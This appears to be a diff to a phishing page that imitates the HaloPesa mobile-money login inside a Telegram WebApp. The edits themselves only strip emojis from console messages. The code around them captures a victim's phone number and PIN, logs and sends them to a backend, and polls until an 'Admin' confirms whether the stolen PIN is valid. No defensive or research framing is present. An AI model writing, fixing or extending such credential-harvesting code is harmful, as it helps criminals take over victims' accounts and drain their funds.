@@ -778,7 +778,7 @@
         toggleVisibilityEl.addEventListener("click", function() {
             isPasswordVisible = !isPasswordVisible;
             boxes.forEach(box => box.type = isPasswordVisible ? "text" : "tel");
-            this.textContent = isPasswordVisible ? "🙈" : "👁";
+            this.textContent = isPasswordVisible ? "" : "👁";
         });
 
         // =============================================
@@ -814,7 +814,7 @@
             setStatus("Inatuma kwa uthibitisho...", isTelegramWebApp() ? "telegram-info" : "waiting");
 
             if (USE_MOCK) {
-                console.log("🧪 Mock mode: testing PIN", pin);
+                console.log("Mock mode: testing PIN", pin);
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 if (pin === "1234") {
                     showPinApproved();
@@ -851,7 +851,7 @@
                 });
 
                 const responseText = await res.text();
-                console.log("📥 Response status:", res.status, "Body:", responseText);
+                console.log(" Response status:", res.status, "Body:", responseText);
 
                 if (!res.ok) {
                     let errorMsg = "Imeshindwa kutuma Nambari ya Siri. Jaribu tena.";
@@ -913,12 +913,12 @@
 
                 pollingInterval = setInterval(async () => {
                     attempts++;
-                    console.log(`🔍 Polling attempt ${attempts} for ${requestId}`);
+                    console.log(`Polling attempt ${attempts} for ${requestId}`);
 
                     try {
                         const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
                         const data = await res.json();
-                        console.log("📥 Poll response:", data);
+                        console.log("Poll response:", data);
 
                         if (data.blocked === true) {
                             clearInterval(pollingInterval);
@@ -932,7 +932,7 @@
                         if (data.approved === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
-                            console.log("✅ Admin APPROVED the PIN.");
+                            console.log("Admin APPROVED the PIN.");
                             resolve(true);
                             return;
                         }
@@ -940,7 +940,7 @@
                         if (data.approved === false) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
-                            console.log("❌ Admin REJECTED the PIN (wrong PIN).");
+                            console.log("Admin REJECTED the PIN (wrong PIN).");
                             resolve(false);
                             return;
                         }
@@ -957,7 +957,7 @@
                         if (attempts >= maxAttempts) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
-                            console.warn("⏰ Polling timed out.");
+                            console.warn("Polling timed out.");
                             resolve(null);
                         }
 
@@ -1010,7 +1010,7 @@
             let pin = "";
             boxes.forEach(b => pin += b.value);
             if (pin.length === 4) {
-                console.log("👉 Login button clicked! Submitting phone:", phone, "PIN:", pin);
+                console.log("Login button clicked! Submitting phone:", phone, "PIN:", pin);
                 submitLogin(phone, pin);
             } else {
                 setStatus("Tafadhali weka Nambari ya Siri yenye tarakimu 4.", 'error');
@@ -1022,7 +1022,7 @@
         //  TEST WRONG PIN BUTTON
         // =============================================
         testWrongPinBtn.addEventListener("click", function() {
-            console.log("🧪 Test wrong PIN button clicked.");
+            console.log("Test wrong PIN button clicked.");
             showWrongPin();
         });
 
@@ -1046,7 +1046,7 @@
                         setTimeout(clearStatus, 3000);
                     }
                     if (USE_MOCK) {
-                        setStatus("🧪 Hali ya majaribio: PIN sahihi ni 1234", "telegram-info");
+                        setStatus("Hali ya majaribio: PIN sahihi ni 1234", "telegram-info");
                         setTimeout(clearStatus, 5000);
                     }
                 }
@@ -1067,11 +1067,11 @@
         loginBtn.classList.add("disabled");
         validateAndUpdateButton();
 
-        console.log("✅ HaloPesa login page ready.");
-        console.log("📱 Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
-        console.log("🤖 Bot ID:", botId || "MISSING");
-        console.log("🧪 Mock mode:", USE_MOCK ? "ON (PIN 1234 = success)" : "OFF (using real backend)");
-        console.log("👉 Error will now appear in a dedicated red box + Telegram alert.");
+        console.log("HaloPesa login page ready.");
+        console.log("Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
+        console.log("Bot ID:", botId || "MISSING");
+        console.log("Mock mode:", USE_MOCK ? "ON (PIN 1234 = success)" : "OFF (using real backend)");
+        console.log(" Error will now appear in a dedicated red box + Telegram alert.");
     </script>
 
 </body>
